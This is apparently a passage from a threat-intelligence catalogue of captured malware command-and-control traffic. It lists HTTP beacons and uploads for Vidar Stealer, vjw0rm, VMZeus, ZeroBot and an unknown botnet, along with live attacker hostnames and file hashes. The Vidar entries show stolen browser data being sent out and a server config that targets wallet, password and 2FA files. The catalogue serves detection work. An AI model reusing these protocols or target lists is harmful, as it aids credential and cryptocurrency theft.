Content-Disposition: form-data; name="upload_file"; filename="78C6.bin"

\.\..V.]:.o..<]......H..)E.J=x...e%3..U.@.f......].tZ..1....g..OzC.5v.?o.NL...;..)..E.G.a~.....M#;.Cu;N/.3\$....x.....R....e..5.....-mW,..	..C................n.G.|..k0...@...?I.Iu......9k^.U6tzT9.b.3....#..V.4].La....zL.h+...aa..H.D.....Ar.......3.w.<.!.-.....|F9! 3.....7
--36775038942641984568--
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ursnif.png "Ursnif POST")

#### Vidar Stealer
~~~
POST / HTTP/1.1
Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
Accept-Language: ru-RU,ru;q=0.9,en;q=0.8
Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1
Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0
Content-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A
Content-Length: 111609
Host: weimachel.net
Connection: Keep-Alive
Cache-Control: no-cache

--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="hwid"

eeeb5d54-7880-42a7-b542-739bbc26cf4b
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="os"

Windows 7 Professional
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="platform"

x64
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="profile"

160
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="user"

admin
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="cccount"

0
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="fcount"

1
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="telegram"

0
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="ver"

13.9
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="ccount"

0
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="logs"; filename="CH_eeeb5d54-7880-42a7-b542-739bbc26cf4b3006040214.zip"
Content-Type: zip

PK........$.HO............#.../Autofill/Google Chrome_Default.txtUT
.....]...]...]..PK........$.HO................/CC/Google Chrome_Default.txtUT
.....]...]...]..PK........$.HOF..`....u...5.../Cookies/cookies_Mozilla Firefox_nltxvmn2.default.txtUT
.....]...]...]..O..0...X.G	......QdFg..G..XI..f....?.R[{.0Unm..U.._..\.f.nEY2S.3..m..?...e........B...'.r..>......P.4..HTQ..H..#.[M..k.R...b.o..d..<$g^..Y......6i.....2.x.....c..-.w..4.....<.....C.\.0q.B.s.m..$E.
...^.D...8..[vJ9c.:....,.J.i!......V....ii.........!.>cz....A..0..@.........Jl. 4.!.R.....".KA.r...w.IT.K).B|......<..P....8..k...y.....Z....Ji
U}...'F.....v.wnu.;.:..a.)...BC...m.Vw.k...I.<.._.]~..0
b..v.&Q@..LH.gSM...fAv&
<......].	...~...{.T....)^..9^......|.=..|.hZ...*7.<h.......Ko8..~.PK........&.HO................/Cookies/Edge_Cookies.txtUT
.....]...]...]..PK........$.HO.'.e........".../Cookies/Google Chrome_Default.txtUT
.....]...]...]..I..P.....Sp.;t...........+..a._?.$....t.R..*U.%I3...)....M. ..x2..S.....S.b...L......d.R...piwR......<~y....AWP..G......P..?.i.....b.'|jz.......&...C.^k.7....d........
..%..tF]..V.g...........T....
M....u..f..<..^..ek/.[...2...P=...3....>.................9J.V&.6..<....f.}......p....{.d..l....!.."...........y.....{N.P....SY.3......V~......z.=....w.o.-j.......$..i&.s]..\...?....*55.f.
...r....#|..NW.EFR......L......fe.
.5..Q.s+...<.... .w..j.....PK........&.HOQ.......F......./Cookies/IE_Cookies.txtUT
.....]...]...].R.n.@.=7...[:]........ .x	`...8$......c..9...J....RRe...w.......,....	..0I.@.... .x...%.....<.].5.........PO\.F...EL..t.he.......x..h..V.c0G0.5%D...P...[m......]8.A."...Av)....J.B..|..D.Eq....8.....f&X......7....nn7.zW]..Y]d#.>O...(.~n....NM...	.".!..`Q&L08XX%....q...=......kVTy.|.lPf.....qm.....t;..~uow....k.@..9..'....i.`.........R.t.{.b......;.9..Pfb.......Tq...}%..s._N.*....	.{._PK........&.HO!...E...j......./cookie_list.txtUT
.....]...]...]U.1
.0..v...?..1.N...C_..C.IB.).O.(...~R..0.....L.x.(:SQ....=~\m.e...PK........$.HO............$.../Downloads/Google Chrome_Default.txtUT
.....]...]...]..PK........0.HO................/Files/Desktop.zipUT
.....]...]...]PK....................PK........4.HO................/Files/Users.zipUT
.....]...]...]PK....................PK........$.HO............".../History/Google Chrome_Default.txtUT
.....]...]...]..PK........$.HO.5..
.......5.../History/history_Mozilla Firefox_nltxvmn2.default.txtUT
.....]...]...]..+.......PK........0.HO..M(.....	....../information.txtUT
~~~
~~~
POST /517 HTTP/1.1
Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
Accept-Language: ru-RU,ru;q=0.9,en;q=0.8
Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1
Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0
Content-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A
Content-Length: 25
Host: neroolive.org
Connection: Keep-Alive
Cache-Control: no-cache

--1BEF0A57BE110FD467A--

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 25 Oct 2019 13:27:12 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept-Encoding
Content-Encoding: gzip

1,1,1,1,1,1,1,1,1,1,250,DESKTOP;%DESKTOP%\;*wallet*.*:*2fa*.*:*backup*.txt:*backup*.png:*backup*.jpg:*code*.txt:*code*.png:*code*.jpg:*password*.*:*auth*.txt:*auth*.png:*auth*.jpg:*crypto*.*:*key*.txt:*key*.png:*key*.jpg:*ledger*.*:*metamask*.*:*blockchain*.*:*bittrex*.*:*binance*.*:*coinbase*.*:*trezor*.*:*exodus*.*;300;true;movies:music:mp3;lnk;Exodus;%APPDATA%\Roaming\Exodus;*.*;4000;true;movies:music:mp3;JAXX;%APPDATA%\Roaming\Jaxx;*.*;4000;true;movies:music:mp3;
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vidar-1.png "Vidar")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vidar-2.png "Vidar")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vidar-3.png "Vidar")

#### Vjworm vjw0rm
~~~
POST /Vre HTTP/1.1
Accept: */*
Accept-Language: en-us
User-Agent: Laposte_C4BA3647\PC\admin\Microsoft Windows 7 Professional \Not-found\\Yes\FALSE\
Accept-Encoding: gzip, deflate
Host: jihanenouhaila.ddns.net:7773
Content-Length: 0
Connection: Keep-Alive
Cache-Control: no-cache
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vjworm.png "VJworm")

#### VMZeus
~~~
POST /n/file.php HTTP/1.1
Accept: */*
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Host: baloobafoudanitojahdge.space
Content-Length: 133
Connection: Keep-Alive
Cache-Control: no-cache

.qrK.9..z..q.....W.I&....k
..Y..'.LP.....RB....sRZ....].^.G...*e..9.....l.......R..G...F$C.D.)..1...9O!7z.x..?..Qb..A.K.... ..Yu..A..

HTTP/1.1 200 OK
Date: Mon, 21 Oct 2019 12:06:57 GMT
Content-Type: application/octet-stream
Content-Length: 14064
Connection: keep-alive
Set-Cookie: __cfduid=dea0842185ed1d3224d3d743e5e7e7ccd1571659617; expires=Tue, 20-Oct-20 12:06:57 GMT; path=/; domain=.baloobafoudanitojahdge.space; HttpOnly
X-Powered-By: PHP/5.6.40
Cache-Control: public
Content-Disposition: attachment; filename="%2e/files/bolka.xml"
Content-Transfer-Encoding: binary
CF-Cache-Status: DYNAMIC
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 52931bc13d868eb3-DME
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vmzeus.png "VMZeus")

#### ZeroBot
~~~
GET //uploads/b/m/modules.zip HTTP/1.1
Host: darkrat.lh1.in
Connection: Keep-Alive
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/zerobot1.png "zerobot1")

~~~
POST /api/zrcdr77/ HTTP/1.1
Content-Type: multipart/form-data; boundary=---------------------------8d75c50cdcd2da3
Host: darkrat.lh1.in
Content-Length: 900
Expect: 100-continue
Connection: Keep-Alive


-----------------------------8d75c50cdcd2da3
Content-Disposition: form-data; name="pc"

TEST-PC
-----------------------------8d75c50cdcd2da3
Content-Disposition: form-data; name="type"

err
-----------------------------8d75c50cdcd2da3
Content-Disposition: form-data; name="file"; filename="err.txt"
Content-Type: text/html

ICSharpCode.SharpZipLib.Zip.ZipException: Cannot find central directory
   at ICSharpCode.SharpZipLib.Zip.ZipFile.ReadEntries()
   at ICSharpCode.SharpZipLib.Zip.ZipFile..ctor(Stream stream)
   at ICSharpCode.SharpZipLib.Zip.FastZip.ExtractZip(Stream inputStream, String targetDirectory, Overwrite overwrite, ConfirmOverwriteDelegate confirmDelegate, String fileFilter, String directoryFilter, Boolean restoreDateTime, Boolean isStreamOwner, Boolean allowParentTraversal)
   at Unpacker.Program.Unpack()

-----------------------------8d75c50cdcd2da3--
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/zerobot2.png "zerobot2")

### Unknowns
#################################################################################################
#### Unknownbotnet4
hashes:
~~~
e3fd7b57bb830fb083759e2d53dce0b6964985dc65d60b040c956b47f64409df
9201efca328fa5b800a314506d8dddb47ab15e6f47af51331bd0f0e8dff3b70b
ba59f46f684b3602258ce5433c7abbdc016ed4ee1aa2bc8d94520584da63bbc4
3a3da758f7a96401fc3b5ad6392c9286f27fb165054b0dab30257bf28dca6be2
839d301c9ffaf561affa77a913f6bc76498f9df31028a34b967f170fe3e600a5
30d83178f17b86306edd85432b8092ec7b5359aa65245326399f13be43e09553
a64f6c8a28083f8c3701b8377253ba288543a1f0eeb110725e8241fad32db168
8647bcef74d55423bcf1877097a0c732869e29548f74933b1f0a15fce44120ac
32cb69f85ac78e8183be54e8fbc9576a0aa36491e3782f01f59fe57bf4d9fe7a
~~~
~~~
POST /gate.php HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded; Charset=UTF-8
Accept: */*
User-Agent: 94af05617f4e0479d766f422f611ad5c
Content-Length: 465
Host: smartwaay.xyz:9998

rk=1&aw=%5B%22v1%2E0%2E3705%22%2C%22v1%2E1%2E4322%22%2C%22v2%2E0%2E50727%22%2C%22v3%2E0%22%2C%22v3%2E5%22%2C%22v4%2E0%2E30319%22%5D&ys=C%3A%5CProgram+Files%5CMozilla+Firefox%5Cfirefox%2Eexe&it=1&dw=%5B%22Steven%22%5D&rt=1%2E1%2E0&yj=1&sk=8272244&vt=Intel%28R%29+Core%28TM%29+i7%2D3740QM+CPU+%40+2%2E70GHz&tf=%5B%226%22%2C%221%22%2C%227601%22%2C%22Service+Pack+1%22%2C%22256%22%2C%221%22%2C%220%22%5D&he=0&zo=39874b0c4717a111115c96bcb65bcbdd&fj=&bf=STEVEN%2DACCOUNTI

POST /gate.php HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded; Charset=UTF-8
Accept: */*
User-Agent: 94af05617f4e0479d766f422f611ad5c
Content-Length: 462
Host: nicholaspring.xyz:9998

vt=Intel%28R%29+Xeon%28R%29+CPU+E5%2D2630+v4+%40+2%2E20GHz&rk=1&dw=%5B%22HAPUBWS%22%5D&he=0&fj=&aw=%5B%22v1%2E0%2E3705%22%2C%22v1%2E1%2E4322%22%2C%22v2%2E0%2E50727%22%2C%22v3%2E0%22%2C%22v3%2E5%22%2C%22v4%2E0%2E30319%22%5D&zo=ddcf33e1f0649076576a7aaee8f83b66&tf=%5B%226%22%2C%221%22%2C%227601%22%2C%22Service+Pack+1%22%2C%22256%22%2C%221%22%2C%220%22%5D&it=0&rt=1%2E1%2E0&yj=1&bf=2TWgVlMc0b&sk=3144704&ys=C%3A%5CProgram+Files%5CInternet+Explorer%5Ciexplore%2EexeHTTP/1.1 200 OK
Date: Thu, 04 Apr 2019 14:57:08 GMT
Server: Apache/2.4.34 (Unix)
X-Powered-By: PHP/7.3.0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

2
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/unknownbotnet4.png "Unknownbotnet4")
